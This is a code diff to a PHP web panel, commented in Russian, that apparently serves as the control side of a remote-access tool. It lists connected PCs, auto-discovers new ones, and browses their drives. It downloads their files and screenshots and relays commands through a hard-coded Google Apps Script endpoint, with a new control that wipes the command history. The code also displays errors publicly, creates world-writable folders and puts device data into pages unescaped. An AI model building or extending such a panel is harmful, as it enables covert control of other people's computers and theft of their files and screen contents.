@@ -3,13 +3,12 @@ ob_start();
 session_start();
 error_reporting(E_ALL); ini_set('display_errors', 1);
 
-// !!! ВСТАВЬ СВОЙ URL GOOGLE SCRIPT НИЖЕ !!!
 $api = "https://script.google.com/macros/s/AKfycbwDgR5LEV3rc7kiJjGqsa6IQkX4ZOfPWFcyA2appKMzSt8D4j7xUIPLkGhQRyExYw1P/exec";
 
 $cache_dir = __DIR__ . '/explorer_cache/';
 if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);
 
-// ПОДДЕРЖКА AJAX ЗАПРОСОВ ДЛЯ ПОЛНОГО ОБНОВЛЕНИЯ ВСЕЙ СТРАНИЦЫ
+// ПОДДЕРЖКА AJAX ЗАПРОСОВ ДЛЯ ОБНОВЛЕНИЯ СТРАНИЦЫ
 if (isset($_GET['api_refresh_all'])) {
     header('Content-Type: application/json');
     
@@ -25,12 +24,15 @@ if (isset($_GET['api_refresh_all'])) {
         $last_file_ptr = $cache_dir . $id . '_lastfile.txt';
         $screen_file = __DIR__ . '/screenshots/screen_' . $id . '.jpg';
         
-        // Считаем статус Онлайн прямо тут
+        // Универсальный парсинг даты для корректного статуса Онлайн
         $time_raw = $d["time"] ?? ""; $last = 0;
         if (!empty($time_raw)) {
-            if (preg_match('/(\d{2})\.(\d{2})\.(\d{4})\s(.*)/', $time_raw, $matches)) {
-                $time_raw = $matches[3] . "-" . $matches[2] . "-" . $matches[1] . " " . $matches[4];
-            } $last = @strtotime($time_raw);
+            $time_raw = str_replace('T', ' ', $time_raw);
+            $time_raw = preg_replace('/\.\d+Z?/', '', $time_raw);
+            $last = @strtotime($time_raw);
+        }
+        if (!$last && preg_match('/(\d{2})\.(\d{2})\.(\d{4})\s(.*)/', $d["time"] ?? "", $matches)) {
+            $last = @strtotime($matches[3] . "-" . $matches[2] . "-" . $matches[1] . " " . $matches[4]);
         }
         $isOnline = ((time() - $last) <= 35 && $last > 0);
 
@@ -101,15 +103,28 @@ if (isset($_GET['download_screen'])) {
 
 // ОБРАБОТЧИК КНОПОК ПАНЕЛИ
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $action = $_POST["action"] ?? ""; $device_id = $_POST["device_id"] ?? ""; $target_path = $_POST["target_path"] ?? "";
-    if (!empty($action) && !empty($device_id)) {
+    $action = $_POST["action"] ?? ""; 
+    $device_id = $_POST["device_id"] ?? ""; 
+    $target_path = $_POST["target_path"] ?? "";
+    
+    if (!empty($action)) {
         if (($action === "get_files" || $action === "download_file") && !empty($target_path)) {
             $action = $action . "::" . $target_path;
         }
-        $ch = curl_init($api); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["action" => $action, "device_id" => $device_id])); 
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']); curl_setopt($ch, CURLOPT_TIMEOUT, 4);
-        curl_exec($ch); curl_close($ch);
+        
+        $postData = ["action" => $action];
+        if (!empty($device_id)) {
+            $postData["device_id"] = $device_id;
+        }
+        
+        $ch = curl_init($api); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData)); 
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']); 
+        curl_setopt($ch, CURLOPT_TIMEOUT, 4);
+        curl_exec($ch); 
+        curl_close($ch);
     }
     if(isset($_POST['js_async'])) { echo "OK"; exit; }
     header("Location: " . $_SERVER['PHP_SELF']); exit;
@@ -136,7 +151,7 @@ body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2
 .card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; transition: 0.3s;}
 .online-card { border-color: #064e3b; box-shadow: 0 4px 20px rgba(4,120,87,0.15); }
 .name{ font-weight:700; font-size:17px; margin-bottom:6px; color:#f8fafc;}
-.status{ font-size:11px; padding:4px 10px; border-radius999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
+.status{ font-size:11px; padding:4px 10px; border-radius:999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
 .online { background:#064e3b; color:#34d399; } .offline { background:#374151; color:#9ca3af; }
 .row{ margin-top:10px; font-size:13px; color:#94a3b8; word-break: break-all;}
 button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; border:none; cursor:pointer; font-weight:600; display:block; text-align:center; box-sizing:border-box; text-decoration:none; font-size:13px; transition: 0.2s;}
@@ -159,7 +174,10 @@ th { color: #64748b; font-size: 11px; text-transform: uppercase;}
 
 <div class="header">
     <span>🖥 Центральная Панель Управления [INFINITY REALTIME]</span>
-    <div class="sync-indicator"><span class="dot"></span>Авто-обнаружение новых ПК (1.5с)</div>
+    <div style="display: flex; align-items: center; gap: 15px;">
+        <button type="button" class="gray-danger" style="width: auto; padding: 6px 12px; margin: 0; font-size: 11px;" onclick="if(confirm('Очистить всю историю команд в таблице?')) sendCmdAsync('', 'clear_commands')">🧹 Очистить историю команд</button>
+        <div class="sync-indicator"><span class="dot"></span>Авто-обнаружение (1.5с)</div>
+    </div>
 </div>
 
 <div class="container" id="devices_container">
@@ -206,7 +224,6 @@ function startRealtimeMonitor() {
             if (!hasDevices) {
                 container.innerHTML = `<div style="color:#4b5563; grid-column:1/-1; text-align:center; padding:40px;">Нет активных ПК в базе данных...</div>`;
             } else {
-                // Собираем HTML для всех карточек
                 let containerHtml = '';
                 
                 for (let id in data.devices) {
@@ -215,7 +232,6 @@ function startRealtimeMonitor() {
                     let statusClass = pc.is_online ? 'status online' : 'status offline';
                     let statusText = pc.is_online ? 'В сети' : 'Не в сети';
                     
-                    // Генерируем элементы проводника
                     let explorerHtml = '';
                     if (pc.current_path !== 'C:\\' && pc.current_path !== 'C:/' && pc.current_path !== '') {
                         let parts = pc.current_path.split(/[\\\/]/); parts.pop(); if(parts.length <= 1) parts = ['C:'];
@@ -236,19 +252,16 @@ function startRealtimeMonitor() {
                         });
                     }
 
-                    // Кнопка скачивания файла
                     let downloadBtnHtml = '';
                     if (pc.last_file && pc.last_file.trim() !== '') {
                         downloadBtnHtml = `<a href="?get_file=${encodeURIComponent(pc.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:8px; box-shadow: 0 0 12px rgba(16,185,129,0.5);">💾 Скачать на свой ПК: ${pc.last_file}</a>`;
                     }
 
-                    // Скриншот кнопка
                     let screenshotBtnHtml = '';
                     if (pc.has_screenshot) {
                         screenshotBtnHtml = `<a href="?download_screen=${id}&v=${pc.screenshot_time}" class="btn-link green" target="_blank" style="margin-bottom:6px; background:#4f46e5;">📥 Посмотреть скриншот экрана</a>`;
                     }
 
-                    // Сборка всей карточки устройства
                     containerHtml += `
                     <div class="${cardClass}">
                         <div class="name">${pc.name}</div>
@@ -270,7 +283,6 @@ function startRealtimeMonitor() {
                     </div>`;
                 }
                 
-                // Чтобы не сбрасывать фокус/скролл, обновляем контейнер только если изменился внутренний HTML структурно
                 if (container.dataset.lastHtml !== containerHtml) {
                     container.innerHTML = containerHtml;
                     container.dataset.lastHtml = containerHtml;
